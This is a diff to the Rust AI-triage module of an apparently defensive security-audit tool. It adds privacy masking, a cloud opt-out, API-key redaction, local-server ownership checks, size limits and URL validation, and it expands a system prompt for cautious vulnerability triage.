@@ -2,6 +2,8 @@
 //!
 //! * `[L]` **Local** ($0): the host's evidence goes, unmasked, to an
 //!   OpenAI-compatible server on this machine (`http://localhost:1234/v1`).
+//!   A "local" server on another machine, or one another login user runs
+//!   on this machine, gets masked text instead, as the cloud does.
 //! * `[C]` **Cloud triage** (OpenRouter): everything is masked by the
 //!   Privacy Vault first. The SHA-256 prompt cache and the daily budget are
 //!   checked before any request; when the budget is spent or no API key is
@@ -17,7 +19,7 @@ use std::path::{Path, PathBuf};
 use std::sync::{Arc, Mutex};
 use std::time::Duration;
 
-use anyhow::{anyhow, bail, Context, Result};
+use anyhow::{bail, Context, Result};
 use rusqlite::{params, OptionalExtension};
 use serde::{Deserialize, Serialize};
 use serde_json::{json, Value};
@@ -26,11 +28,11 @@ use sha2::{Digest, Sha256};
 use crate::anthropic;
 use crate::checklist;
 use crate::db::Db;
-use crate::evidence::{sanitize, sanitize_block, Source, VerificationStatus};
+use crate::evidence::{sanitize, Source, VerificationStatus};
 use crate::graph::{Graph, Host};
 use crate::timeutil::{now_rfc3339, today_utc};
 use crate::vault::Vault;
-use crate::workspace::private_open_options;
+use crate::workspace::{private_open_options, read_private_bounded, refuse_file_symlink};
 
 pub const API_KEY_ENV: &str = "OPENROUTER_API_KEY";
 const CONNECT_TIMEOUT: Duration = Duration::from_secs(5);
@@ -38,7 +40,14 @@ const REQUEST_TIMEOUT: Duration = Duration::from_secs(240);
 const MAX_PATHS: usize = 40;
 const MAX_FACTS: usize = 60;
 const MAX_HYPOTHESES: usize = 25;
+/// A host answering on a thousand ports with a hundred certificate names
+/// each (a tarpit) does not become a request of megabytes.
+const MAX_PORTS: usize = 64;
+const MAX_NAMES_PER_PORT: usize = 16;
+const MAX_CPES_PER_PORT: usize = 8;
 const MAX_REPLY: usize = 200_000;
+const MAX_PROMPT_CACHE_ROWS: i64 = 5_000;
+const MAX_AI_TOML_BYTES: u64 = 256 * 1024;
 
 #[derive(Debug, Clone, Copy, PartialEq, Eq, Serialize, Deserialize)]
 #[serde(rename_all = "snake_case")]
@@ -86,7 +95,7 @@ pub enum CloudProvider {
 }
 
 /// `[ai]` section of `config.toml`.
-#[derive(Debug, Clone, PartialEq, Deserialize)]
+#[derive(Clone, PartialEq, Deserialize)]
 #[serde(default)]
 pub struct AiSettings {
     /// OpenAI-compatible server on this machine (LM Studio, MLX, Ollama).
@@ -110,11 +119,42 @@ pub struct AiSettings {
     /// before declines a request. Left out, the built-in chain applies; an
     /// empty list leaves the choice to the API.
     pub cloud_fallbacks: Option<Vec<String>>,
+    /// When true, cloud AI tiers stay disabled even if an API key environment
+    /// variable (`OPENROUTER_API_KEY` / `ANTHROPIC_API_KEY`) is exported.
+    #[serde(default, skip_serializing_if = "std::ops::Not::not")]
+    pub disable_cloud: bool,
+    /// Send the operator's notes with a request that leaves this machine.
+    /// Off: a note is free text, and no pattern recognises a password that
+    /// is written like a word (`tried admin / Winter2026`).
+    pub cloud_notes: bool,
     /// The user's own setup file (`~/.meow/ai.toml`), written by
     /// `meow setup`. Read again for every request, so a change applies to a
     /// running session at once.
     #[serde(skip)]
     pub user_file: Option<PathBuf>,
+}
+
+impl std::fmt::Debug for AiSettings {
+    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
+        f.debug_struct("AiSettings")
+            .field("local_url", &self.local_url)
+            .field("local_model", &self.local_model)
+            .field("cloud_url", &self.cloud_url)
+            .field("cloud_model", &self.cloud_model)
+            .field("research_model", &self.research_model)
+            .field("max_daily_usd", &self.max_daily_usd)
+            .field("max_daily_calls", &self.max_daily_calls)
+            .field(
+                "openrouter_api_key",
+                &self.openrouter_api_key.as_ref().map(|_| "[REDACTED]"),
+            )
+            .field("cloud_provider", &self.cloud_provider)
+            .field("cloud_fallbacks", &self.cloud_fallbacks)
+            .field("disable_cloud", &self.disable_cloud)
+            .field("cloud_notes", &self.cloud_notes)
+            .field("user_file", &self.user_file)
+            .finish()
+    }
 }
 
 impl Default for AiSettings {
@@ -130,6 +170,8 @@ impl Default for AiSettings {
             openrouter_api_key: None,
             cloud_provider: None,
             cloud_fallbacks: None,
+            disable_cloud: false,
+            cloud_notes: false,
             user_file: None,
         }
     }
@@ -140,7 +182,7 @@ impl Eq for AiSettings {}
 /// A user's own AI setup, kept in `~/.meow/ai.toml` (private to them, never
 /// part of the repository). Whatever is set here overrides `[ai]` in
 /// `config.toml`; the rest is left alone.
-#[derive(Debug, Clone, Default, PartialEq, Eq, Serialize, Deserialize)]
+#[derive(Clone, Default, PartialEq, Eq, Serialize, Deserialize)]
 pub struct AiOverrides {
     #[serde(default, skip_serializing_if = "Option::is_none")]
     pub local_url: Option<String>,
@@ -158,6 +200,24 @@ pub struct AiOverrides {
     pub cloud_fallbacks: Option<Vec<String>>,
     #[serde(default, skip_serializing_if = "Option::is_none")]
     pub api_key: Option<String>,
+    #[serde(default, skip_serializing_if = "std::ops::Not::not")]
+    pub disable_cloud: bool,
+}
+
+impl std::fmt::Debug for AiOverrides {
+    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
+        f.debug_struct("AiOverrides")
+            .field("local_url", &self.local_url)
+            .field("local_model", &self.local_model)
+            .field("cloud_url", &self.cloud_url)
+            .field("cloud_model", &self.cloud_model)
+            .field("research_model", &self.research_model)
+            .field("cloud_provider", &self.cloud_provider)
+            .field("cloud_fallbacks", &self.cloud_fallbacks)
+            .field("api_key", &self.api_key.as_ref().map(|_| "[REDACTED]"))
+            .field("disable_cloud", &self.disable_cloud)
+            .finish()
+    }
 }
 
 const OVERRIDES_HEADER: &str = "\
@@ -168,12 +228,25 @@ const OVERRIDES_HEADER: &str = "\
 impl AiOverrides {
     /// Reads the file; a missing file is an empty setup.
     pub fn load(path: &Path) -> Result<Self> {
-        match std::fs::read_to_string(path) {
-            Ok(text) => {
-                toml::from_str(&text).with_context(|| format!("invalid {}", path.display()))
+        match std::fs::symlink_metadata(path) {
+            Ok(_) => {}
+            Err(error) if error.kind() == std::io::ErrorKind::NotFound => {
+                return Ok(Self::default());
             }
-            Err(error) if error.kind() == std::io::ErrorKind::NotFound => Ok(Self::default()),
-            Err(error) => Err(error).with_context(|| format!("cannot read {}", path.display())),
+            Err(error) => {
+                return Err(error).with_context(|| format!("cannot read {}", path.display()));
+            }
+        }
+        match read_private_bounded(path, MAX_AI_TOML_BYTES) {
+            Ok(text) => crate::workspace::parse_toml(&text, path),
+            Err(error)
+                if error
+                    .downcast_ref::<std::io::Error>()
+                    .is_some_and(|io| io.kind() == std::io::ErrorKind::NotFound) =>
+            {
+                Ok(Self::default())
+            }
+            Err(error) => Err(error),
         }
     }
 
@@ -189,6 +262,10 @@ impl AiOverrides {
                 *target = value.trim().to_owned();
             }
         };
+        let has_cloud_url = self
+            .cloud_url
+            .as_deref()
+            .is_some_and(|v| !v.trim().is_empty());
         set(&mut settings.local_url, self.local_url);
         set(&mut settings.cloud_url, self.cloud_url);
         set(&mut settings.cloud_model, self.cloud_model);
@@ -205,6 +282,15 @@ impl AiOverrides {
         }
         if self.cloud_fallbacks.is_some() {
             settings.cloud_fallbacks = self.cloud_fallbacks;
+        }
+        if self.disable_cloud {
+            settings.disable_cloud = true;
+            settings.openrouter_api_key = None;
+        } else if settings.openrouter_api_key.is_some()
+            || self.cloud_provider.is_some()
+            || has_cloud_url
+        {
+            settings.disable_cloud = false;
         }
     }
 }
@@ -254,17 +340,45 @@ impl AiSettings {
         }
     }
 
+    /// Whether the key in the environment is meant for the service these
+    /// settings name. `OPENROUTER_API_KEY` is OpenRouter's and
+    /// `ANTHROPIC_API_KEY` the Claude API's: neither goes to another address
+    /// because that address speaks the same protocol. A stand-in on this
+    /// machine is the user's own.
+    fn env_key_applies(&self) -> bool {
+        let host = url::Url::parse(self.cloud_url.trim())
+            .ok()
+            .and_then(|url| url.host_str().map(str::to_ascii_lowercase))
+            .unwrap_or_default();
+        is_loopback_url(&self.cloud_url)
+            || match self.provider() {
+                CloudProvider::Anthropic => host == "api.anthropic.com",
+                CloudProvider::OpenAi => host == "openrouter.ai",
+            }
+    }
+
     /// Where the API key comes from, for `meow setup`: the environment wins
     /// over the user's file, which wins over `config.toml`.
     pub fn key_source(&self) -> Option<String> {
         let filled = |key: &Option<String>| key.as_deref().is_some_and(|k| !k.trim().is_empty());
-        let in_file = self
+        let overrides = self
             .user_file
             .as_deref()
-            .and_then(|path| AiOverrides::load(path).ok())
-            .is_some_and(|overrides| filled(&overrides.api_key));
-        let variable = self.effective().key_variable();
-        if std::env::var(variable).is_ok_and(|key| !key.trim().is_empty()) {
+            .and_then(|path| AiOverrides::load(path).ok());
+        let in_file = overrides
+            .as_ref()
+            .is_some_and(|loaded| filled(&loaded.api_key));
+        let mut effective = self.clone();
+        if let Some(loaded) = overrides {
+            loaded.apply(&mut effective);
+        }
+        if effective.disable_cloud {
+            return None;
+        }
+        let variable = effective.key_variable();
+        if effective.env_key_applies()
+            && std::env::var(variable).is_ok_and(|key| !key.trim().is_empty())
+        {
             Some(format!("the {variable} environment variable"))
         } else if in_file {
             Some("your setup file".to_owned())
@@ -276,8 +390,12 @@ impl AiSettings {
     }
 
     pub fn api_key(&self) -> Option<String> {
+        if self.disable_cloud {
+            return None;
+        }
         std::env::var(self.key_variable())
             .ok()
+            .filter(|key| !key.trim().is_empty() && self.env_key_applies())
             .or_else(|| self.openrouter_api_key.clone())
             .map(|key| key.trim().to_owned())
             .filter(|key| !key.is_empty())
@@ -301,8 +419,12 @@ const TRIAGE_SYSTEM: &str = "\
 You are a defensive security triage assistant for the operator of an authorized audit. Your job is to \
 help them verify and fix weaknesses, not to attack. Do not write exploit code or attack steps.
 
-Base every statement on the evidence in the document. Entries under `hypotheses` are unverified matches \
-from vulnerability databases: say so, and say what would confirm or rule them out. Be concise.
+Base every statement on the evidence in the document. Factor in the ASN / hosting provider context \
+(cloud VPS vs. residential or corporate network) and any WAF/CDN when assessing exposure. Facts from \
+`ssh_kex`, `http_header`, and `tls_cert` reflect ground-truth runtime configurations (unaffected by \
+distro package backporting). Entries under `hypotheses` are unverified CVE/OSV matches from \
+vulnerability databases: prioritize concrete verification commands for candidate CVEs while explicitly \
+accounting for Linux distribution backported patches (`distro_backport_note`) before confirming. Be concise.
 
 Answer in Markdown with exactly these three sections:
 
@@ -343,9 +465,13 @@ fn clean(text: &str) -> String {
 
 /// The compact, size-capped view of one host that the triage tiers see.
 fn compact_host(graph: &Graph, host: &Host) -> Value {
-    let ports: Vec<Value> = host
-        .ports
-        .values()
+    // Open ports first: they are what a triage is about.
+    let mut listed: Vec<&crate::graph::Port> = host.ports.values().collect();
+    listed.sort_by_key(|port| port.state != "open");
+    let ports_left_out = listed.len().saturating_sub(MAX_PORTS);
+    let ports: Vec<Value> = listed
+        .into_iter()
+        .take(MAX_PORTS)
         .map(|port| {
             let paths: Vec<String> = port
                 .paths
@@ -363,10 +489,19 @@ fn compact_host(graph: &Graph, host: &Host) -> Value {
                 "service": port.service,
                 "product": port.product,
                 "version": port.version,
-                "cpes": port.cpes,
+                "cpes": port.cpes.iter().take(MAX_CPES_PER_PORT).collect::<Vec<_>>(),
                 "http_server": port.http.as_ref().and_then(|h| h.server.clone()),
+                "http_title": port.http.as_ref().and_then(|h| h.title.clone()),
+                "http_powered_by": port.http.as_ref().and_then(|h| h.powered_by.clone()),
+                "waf_cdn": port.http.as_ref().and_then(|h| h.waf.clone()),
+                "favicon_hash": port.http.as_ref().and_then(|h| h.favicon_hash),
+                "favicon_framework": port.http.as_ref().and_then(|h| h.favicon_framework.clone()),
+                "missing_security_headers": port.http.as_ref().map(|h| h.missing_headers.clone()).unwrap_or_default(),
+                "tls_versions": port.http.as_ref().map(|h| h.tls_versions.clone()).unwrap_or_default(),
+                "tls_weak_ciphers": port.http.as_ref().map(|h| h.tls_weak_ciphers.clone()).unwrap_or_default(),
                 "redirects_to": port.http.as_ref().and_then(|h| h.location.clone()),
-                "tls_names": port.tls_sans,
+                "tls_names": port.tls_sans.iter().take(MAX_NAMES_PER_PORT).collect::<Vec<_>>(),
+                "tls_names_left_out": port.tls_sans.len().saturating_sub(MAX_NAMES_PER_PORT),
                 "paths": paths,
             })
         })
@@ -376,8 +511,21 @@ fn compact_host(graph: &Graph, host: &Host) -> Value {
         .facts
         .iter()
         .chain(host.ports.values().flat_map(|p| p.facts.iter()));
-    let (notes, observed): (Vec<_>, Vec<_>) =
+    let (notes, mut observed): (Vec<_>, Vec<_>) =
         all_facts.partition(|f| f.record.source == Source::ManualNote);
+    observed.sort_by_key(|fact| match fact.record.source {
+        Source::CisaKev
+        | Source::SshKex
+        | Source::TlsCert
+        | Source::HttpHeader
+        | Source::WafCdn
+        | Source::Favicon
+        | Source::Rdap
+        | Source::AsnDns
+        | Source::Dns
+        | Source::CtLog => 0u8,
+        _ => 1u8,
+    });
     let observed: Vec<Value> = observed
         .iter()
         .take(MAX_FACTS)
@@ -414,6 +562,7 @@ fn compact_host(graph: &Graph, host: &Host) -> Value {
                 "matched_on": advisory.matched,
                 "port": advisory.port,
                 "status": advisory.record.verification_status,
+                "distro_backport_note": checklist::backport_note_for(host, advisory.port.as_deref()),
                 "verification_checklist": checks,
             })
         })
@@ -423,7 +572,14 @@ fn compact_host(graph: &Graph, host: &Host) -> Value {
         "address": host.address,
         "hostnames": host.hostnames,
         "operating_system": host.os,
+        "asn": host.asn,
+        "bgp_prefix": host.bgp_prefix,
+        "country": host.country,
+        "ipv6_dns": host.ipv6_dns,
+        "waf_cdn": host.waf_cdn,
+        "route_hops": host.hops,
         "ports": ports,
+        "ports_left_out": ports_left_out,
         "observed_facts": observed,
         "hypotheses": hypotheses,
         "operator_notes": notes.iter().map(|n| clean(&n.claim)).collect::<Vec<_>>(),
@@ -487,12 +643,18 @@ pub struct Usage {
 }
 
 fn parse_usage(usage: &Value) -> Usage {
+    let raw_cost = usage.get("cost").and_then(Value::as_f64).unwrap_or(0.0);
     Usage {
-        cost_usd: usage.get("cost").and_then(Value::as_f64).unwrap_or(0.0),
+        cost_usd: if raw_cost.is_finite() && raw_cost > 0.0 {
+            raw_cost
+        } else {
+            0.0
+        },
         web_search_requests: usage
             .pointer("/server_tool_use/web_search_requests")
             .and_then(Value::as_u64)
-            .unwrap_or(0) as u32,
+            .unwrap_or(0)
+            .min(u64::from(u32::MAX)) as u32,
         prompt_tokens: usage
             .get("prompt_tokens")
             .and_then(Value::as_u64)
@@ -518,12 +680,20 @@ pub struct Budget {
 
 impl Budget {
     pub fn exhausted(&self) -> bool {
-        self.spent_usd >= self.max_usd || self.calls >= self.max_calls
+        !self.spent_usd.is_finite()
+            || !self.max_usd.is_finite()
+            || self.spent_usd >= self.max_usd
+            || self.calls >= self.max_calls
     }
 }
 
-fn record_usage(db: &Db, tier: Tier, model: &str, usage: &Usage) -> Result<()> {
-    db.conn().execute(
+fn record_usage_conn(
+    conn: &rusqlite::Connection,
+    tier: Tier,
+    model: &str,
+    usage: &Usage,
+) -> Result<()> {
+    conn.execute(
         "INSERT INTO ai_usage (day_utc, tier, model, cost_usd, web_search_requests,
                                prompt_tokens, completion_tokens, created_utc)
          VALUES (?1, ?2, ?3, ?4, ?5, ?6, ?7, ?8)",
@@ -533,12 +703,34 @@ fn record_usage(db: &Db, tier: Tier, model: &str, usage: &Usage) -> Result<()> {
             model,
             usage.cost_usd,
             usage.web_search_requests,
-            usage.prompt_tokens as i64,
-            usage.completion_tokens as i64,
+            usage.prompt_tokens.min(i64::MAX as u64) as i64,
+            usage.completion_tokens.min(i64::MAX as u64) as i64,
             now_rfc3339()
         ],
     )?;
     Ok(())
+}
+
+fn record_usage(db: &Db, tier: Tier, model: &str, usage: &Usage) -> Result<()> {
+    record_usage_conn(db.conn(), tier, model, usage)
+}
+
+fn append_bounded_utf8<'a>(target: &mut String, piece: &'a str, max: usize) -> &'a str {
+    let remaining = max.saturating_sub(target.len());
+    if remaining == 0 {
+        return "";
+    }
+    if piece.len() <= remaining {
+        target.push_str(piece);
+        return piece;
+    }
+    let mut end = remaining;
+    while !piece.is_char_boundary(end) {
+        end -= 1;
+    }
+    let prefix = &piece[..end];
+    target.push_str(prefix);
+    prefix
 }
 
 /// Today's cloud spending against the configured caps.
@@ -594,6 +786,8 @@ pub struct Outcome {
 
 pub struct AiEngine {
     http: reqwest::Client,
+    /// For a server on this machine: no proxy, `localhost` pinned.
+    local_http: reqwest::Client,
     settings: AiSettings,
     db: Arc<Mutex<Db>>,
     /// One request at a time, so two requests cannot both pass the budget
@@ -605,23 +799,361 @@ fn lock_db(db: &Arc<Mutex<Db>>) -> std::sync::MutexGuard<'_, Db> {
     db.lock().unwrap_or_else(|poisoned| poisoned.into_inner())
 }
 
+/// The most of one answer that is read from a model server. Only the first
+/// [`MAX_REPLY`] bytes of text are kept; this bounds what is read to find
+/// them, whatever the server sends and for however long.
+pub const MAX_ANSWER_BYTES: usize = 16 * 1024 * 1024;
+/// The longest line of a streamed answer.
+const MAX_STREAM_LINE: usize = 1024 * 1024;
+/// How much of an error page is read for its message.
+const MAX_ERROR_BYTES: usize = 64 * 1024;
+
+fn is_unspecified_host(host: &url::Host<&str>) -> bool {
+    match host {
+        url::Host::Domain(_) => false,
+        url::Host::Ipv4(ip) => ip.is_unspecified(),
+        url::Host::Ipv6(ip) => ip.is_unspecified() || ip.to_canonical().is_unspecified(),
+    }
+}
+
+/// Validates a local AI endpoint URL: must use `http://` or `https://` with a
+/// concrete host (never `0.0.0.0`/`::`), and without embedded credentials,
+/// query parameters, or fragments. Non-loopback hosts are allowed here because
+/// `run_local` automatically masks prompts sent off-machine (`ISS-025`).
+pub fn validate_local_url(raw: &str) -> Result<String> {
+    let url = raw.trim().trim_end_matches('/');
+    let parsed = url::Url::parse(url).with_context(|| format!("'{raw}' is not a URL"))?;
+    let Some(host) = parsed.host() else {
+        bail!("'{raw}' must start with http:// or https://");
+    };
+    if !matches!(parsed.scheme(), "http" | "https") {
+        bail!("'{raw}' must start with http:// or https://");
+    }
+    if is_unspecified_host(&host) {
+        bail!("'{raw}' must name a specific host, not 0.0.0.0 or ::");
+    }
+    if !parsed.username().is_empty()
+        || parsed.password().is_some()
+        || parsed.query().is_some()
+        || parsed.fragment().is_some()
+    {
+        bail!("'{raw}' must not include credentials, query parameters, or fragments");
+    }
+    Ok(url.to_owned())
+}
+
+/// An HTTP client for the model server at `url`. One on this machine is
+/// reached directly: never through a proxy taken from the environment or
+/// the system settings, which would be handed the unmasked request to pass
+/// on, and `localhost` is this machine whatever a resolver says.
+pub fn http_client(url: &str, timeout: Duration) -> Result<reqwest::Client> {
+    let mut builder = reqwest::Client::builder()
+        .connect_timeout(CONNECT_TIMEOUT)
+        .timeout(timeout)
+        .redirect(reqwest::redirect::Policy::none())
+        .user_agent("security-audit-client");
+    if is_loopback_url(url) {
+        builder = builder
+            .no_proxy()
+            .resolve("localhost", std::net::SocketAddr::from(([127, 0, 0, 1], 0)));
+    }
+    builder.build().context("cannot create the HTTP client")
+}
+
+/// Cuts `text` to at most `max` bytes, between two characters.
+/// (`String::truncate` panics when `max` falls inside one.)
+pub fn cut(text: &mut String, max: usize) {
+    if text.len() > max {
+        let mut end = max;
+        while !text.is_char_boundary(end) {
+            end -= 1;
+        }
+        text.truncate(end);
+    }
+}
+
+/// Reads a whole answer of at most `max` bytes; a longer one is an error.
+pub async fn read_bounded(response: &mut reqwest::Response, max: usize) -> Result<Vec<u8>> {
+    if let Some(len) = response.content_length() {
+        if len > max as u64 {
+            bail!(
+                "the reply is larger than the {} MB meow reads",
+                max / (1024 * 1024)
+            );
+        }
+    }
+    let mut body = Vec::new();
+    while let Some(chunk) = response.chunk().await.context("the reply was cut off")? {
+        if body.len().saturating_add(chunk.len()) > max {
+            bail!(
+                "the reply is larger than the {} MB meow reads",
+                max / (1024 * 1024)
+            );
+        }
+        body.extend_from_slice(&chunk);
+    }
+    Ok(body)
+}
+
+/// The start of an error page, as text.
+pub async fn read_error(response: &mut reqwest::Response) -> String {
+    let mut body = Vec::new();
+    while let Ok(Some(chunk)) = response.chunk().await {
+        let room = MAX_ERROR_BYTES.saturating_sub(body.len());
+        if room == 0 {
+            break;
+        }
+        body.extend_from_slice(&chunk[..chunk.len().min(room)]);
+        if body.len() >= MAX_ERROR_BYTES {
+            break;
+        }
+    }
+    String::from_utf8_lossy(&body).into_owned()
+}
+
+/// The lines of a streamed answer. A line that never ends, or a stream
+/// that never stops, is an error instead of memory.
+#[derive(Default)]
+pub struct StreamLines {
+    buffer: Vec<u8>,
+    /// How much of `buffer` is known to hold no line end.
+    searched: usize,
+    total: usize,
+}
+
+impl StreamLines {
+    pub fn push(&mut self, chunk: &[u8]) -> Result<()> {
+        self.total = self.total.saturating_add(chunk.len());
+        if self.total > MAX_ANSWER_BYTES {
+            bail!(
+                "the reply is larger than the {} MB meow reads",
+                MAX_ANSWER_BYTES / (1024 * 1024)
+            );
+        }
+        self.buffer.extend_from_slice(chunk);
+        Ok(())
+    }
+
+    /// The next whole line, without its line end.
+    pub fn next_line(&mut self) -> Result<Option<String>> {
+        match self.buffer[self.searched..]
+            .iter()
+            .position(|b| *b == b'\n')
+        {
+            Some(at) => {
+                let end = self.searched + at;
+                if end > MAX_STREAM_LINE {
+                    bail!("the reply has a line longer than meow reads");
+                }
+                let text = String::from_utf8_lossy(&self.buffer[..end])
+                    .trim()
+                    .to_owned();
+                self.buffer.drain(..=end);
+                self.searched = 0;
+                Ok(Some(text))
+            }
+            None => {
+                self.searched = self.buffer.len();
+                if self.buffer.len() > MAX_STREAM_LINE {
+                    bail!("the reply has a line longer than meow reads");
+                }
+                Ok(None)
+            }
+        }
+    }
+}
+
+/// Whether `raw` names this machine itself: `localhost` or a loopback
+/// address (including IPv4-mapped IPv6 `[::ffff:127.0.0.1]`).
+pub fn is_loopback_url(raw: &str) -> bool {
+    url::Url::parse(raw.trim()).is_ok_and(|url| match url.host() {
+        Some(url::Host::Domain(domain)) => domain.eq_ignore_ascii_case("localhost"),
+        Some(url::Host::Ipv4(ip)) => ip.is_loopback(),
+        Some(url::Host::Ipv6(ip)) => ip.to_canonical().is_loopback(),
+        None => false,
+    })
+}
+
+/// Parses a single line of Linux `/proc/net/tcp` or `/proc/net/tcp6` and
+/// returns the listener's UID when it is in `TCP_LISTEN` (`0A`) on `port`.
+#[cfg(any(target_os = "linux", test))]
+fn parse_proc_tcp_listener(line: &str, port: u16) -> Option<u32> {
+    // sl local_address rem_address st tx:rx tr:when retrnsmt uid ...
+    let mut fields = line.split_whitespace();
+    let local = fields.nth(1)?;
+    let state = fields.nth(1)?;
+    let uid = fields.nth(3)?;
+    let local_port = u16::from_str_radix(local.rsplit(':').next()?, 16).ok()?;
+    (state == "0A" && local_port == port)
+        .then(|| uid.parse().ok())
+        .flatten()
+}
+
+/// The users (by uid) listening on `port`, read from a Linux
+/// `/proc/net/tcp` or `/proc/net/tcp6` table.
+#[cfg(test)]
+fn listener_uids(table: &str, port: u16) -> Vec<u32> {
+    table
+        .lines()
+        .skip(1)
+        .filter_map(|line| parse_proc_tcp_listener(line, port))
+        .collect()
+}
+
+#[cfg(any(target_os = "macos", test))]
+fn lsof_listener_uids(output: &str) -> Vec<u32> {
+    output
+        .lines()
+        .filter_map(|line| line.strip_prefix('u')?.trim().parse::<u32>().ok())
+        .collect()
+}
+
+/// Another login user who listens on the port of the "local" model server.
+/// On a shared machine anyone can answer on an unused loopback port, and
+/// the local tier sends evidence unmasked.
+fn another_users_server(url: &str) -> Option<u32> {
+    #[cfg(target_os = "linux")]
+    {
+        use std::io::{BufRead, BufReader, Read};
+        // Service accounts (a system-wide model server) are below this.
+        const FIRST_LOGIN_UID: u32 = 1000;
+        const MAX_PROC_NET_BYTES: u64 = 16 * 1024 * 1024;
+        let port = url::Url::parse(url.trim()).ok()?.port_or_known_default()?;
+        // SAFETY: geteuid has no preconditions and cannot fail.
+        let me = unsafe { libc::geteuid() };
+        for table in ["/proc/net/tcp", "/proc/net/tcp6"] {
+            let Ok(file) = std::fs::File::open(table) else {
+                continue;
+            };
+            let reader = BufReader::new(file.take(MAX_PROC_NET_BYTES));
+            for line in reader.lines().skip(1).map_while(Result::ok) {
+                if let Some(uid) = parse_proc_tcp_listener(&line, port) {
+                    if uid >= FIRST_LOGIN_UID && uid != me {
+                        return Some(uid);
+                    }
+                }
+            }
+        }
+        None
+    }
+    #[cfg(target_os = "macos")]
+    {
+        use std::io::Read;
+        use std::process::{Command, Stdio};
+        const FIRST_LOGIN_UID: u32 = 501;
+        let port = url::Url::parse(url.trim()).ok()?.port_or_known_default()?;
+        // SAFETY: geteuid has no preconditions and cannot fail.
+        let me = unsafe { libc::geteuid() };
+        let mut child = Command::new("/usr/sbin/lsof")
+            .args([
+                "-nP",
+                "-b",
+                &format!("-iTCP:{port}"),
+                "-sTCP:LISTEN",
+                "-F",
+                "u",
+            ])
+            .stdin(Stdio::null())
+            .stdout(Stdio::piped())
+            .stderr(Stdio::null())
+            .spawn()
+            .ok()?;
+        let deadline = std::time::Instant::now() + Duration::from_millis(300);
+        loop {
+            match child.try_wait() {
+                Ok(Some(_)) => break,
+                Ok(None) if std::time::Instant::now() < deadline => {
+                    std::thread::sleep(Duration::from_millis(10));
+                }
+                _ => {
+                    let _ = child.kill();
+                    let _ = child.wait();
+                    return None;
+                }
+            }
+        }
+        let mut out = String::new();
+        child
+            .stdout
+            .take()?
+            .take(64 * 1024)
+            .read_to_string(&mut out)
+            .ok()?;
+        lsof_listener_uids(&out)
+            .into_iter()
+            .find(|uid| *uid >= FIRST_LOGIN_UID && *uid != me)
+    }
+    #[cfg(not(any(target_os = "linux", target_os = "macos")))]
+    {
+        let _ = url;
+        None
+    }
+}
+
+/// Masks a prompt for leaving this machine, and proves nothing private is
+/// left in it before it goes. The operator's notes are left out unless
+/// `with_notes`: the prompt then says how many were withheld.
+fn mask_prompt(
+    vault: &Mutex<Vault>,
+    graph: &Graph,
+    prompt: &Prompt,
+    with_notes: bool,
+) -> Result<(String, crate::vault::StreamUnmasker)> {
+    let mut vault = vault.lock().unwrap_or_else(|p| p.into_inner());
+    vault.register_graph(graph);
+    vault.register_operator();
+    // Everything is masked, the notes too: a secret in a note is then on
+    // the list of what to rotate, whether or not the note is sent.
+    let mut user = vault.mask_json(&prompt.user);
+    if !with_notes {
+        if let Some(data) = user
+            .get_mut("untrusted_scan_data")
+            .and_then(Value::as_object_mut)
+        {
+            let withheld = data
+                .remove("operator_notes")
+                .and_then(|notes| notes.as_array().map(Vec::len))
+                .unwrap_or(0);
+            if withheld > 0 {
+                data.insert("operator_notes_withheld".to_owned(), json!(withheld));
+            }
+        }
+    }
+    let masked = user.to_string();
+    let leaks = vault.leaks_json(&user);
+    if !leaks.is_empty() {
+        bail!(
+            "refusing to send: the masked request still contains private values ({})",
+            leaks.join(", ")
+        );
+    }
+    let unmasker = vault.stream_for(&masked);
+    Ok((masked, unmasker))
+}
+
 /// Validates a cloud AI endpoint URL: must use `https://`, or `http://` only
-/// when the host is loopback (`localhost`, `127.0.0.0/8`, `::1`).
+/// when the host is loopback (`localhost`, `127.0.0.0/8`, `::1`), and must not
+/// contain userinfo, query parameters, or fragments.
 pub fn validate_cloud_url(raw: &str) -> Result<String> {
     let url = raw.trim().trim_end_matches('/');
     let parsed = url::Url::parse(url).with_context(|| format!("'{raw}' is not a URL"))?;
     let Some(host) = parsed.host() else {
         bail!("'{raw}' must start with https://");
     };
+    if is_unspecified_host(&host) {
+        bail!("'{raw}' must name a specific host, not 0.0.0.0 or ::");
+    }
+    if !parsed.username().is_empty()
+        || parsed.password().is_some()
+        || parsed.query().is_some()
+        || parsed.fragment().is_some()
+    {
+        bail!("'{raw}' must not include credentials, query parameters, or fragments");
+    }
     match parsed.scheme() {
         "https" => Ok(url.to_owned()),
         "http" => {
-            let is_loopback = match host {
-                url::Host::Domain(domain) => domain.eq_ignore_ascii_case("localhost"),
-                url::Host::Ipv4(ip) => ip.is_loopback(),
-                url::Host::Ipv6(ip) => ip.is_loopback(),
-            };
-            if is_loopback {
+            if is_loopback_url(url) {
                 Ok(url.to_owned())
             } else {
                 bail!(
@@ -635,19 +1167,21 @@ pub fn validate_cloud_url(raw: &str) -> Result<String> {
 
 impl AiEngine {
     pub fn new(settings: AiSettings, db: Arc<Mutex<Db>>) -> Result<Self> {
-        let http = reqwest::Client::builder()
-            .connect_timeout(CONNECT_TIMEOUT)
-            .timeout(REQUEST_TIMEOUT)
-            .redirect(reqwest::redirect::Policy::none())
-            .user_agent("security-audit-client")
-            .build()
-            .context("cannot create the HTTP client")?;
         Ok(Self {
-            http,
+            http: http_client("https://elsewhere.invalid", REQUEST_TIMEOUT)?,
+            local_http: http_client("http://localhost", REQUEST_TIMEOUT)?,
             settings,
             db,
             gate: tokio::sync::Mutex::new(()),
         })
+    }
+
+    fn client(&self, url: &str) -> &reqwest::Client {
+        if is_loopback_url(url) {
+            &self.local_http
+        } else {
+            &self.http
+        }
     }
 
     pub fn budget(&self) -> Budget {
@@ -665,14 +1199,19 @@ impl AiEngine {
     ) -> Result<(String, Usage)> {
         if api_key.is_some() {
             validate_cloud_url(base)?;
+        } else {
+            validate_local_url(base)?;
         }
         let url = format!("{}/chat/completions", base.trim_end_matches('/'));
         let mut request = self
-            .http
+            .client(base)
             .post(&url)
             .header("Accept", "text/event-stream")
             .json(body);
         if let Some(key) = api_key {
+            if key.trim().is_empty() || key.len() > 512 || key.chars().any(char::is_control) {
+                bail!("the configured API key is empty or contains control characters");
+            }
             request = request.bearer_auth(key);
         }
         let mut response = match request.send().await {
@@ -693,7 +1232,7 @@ impl AiEngine {
         };
         let status = response.status();
         if !status.is_success() {
-            let detail = response.text().await.unwrap_or_default();
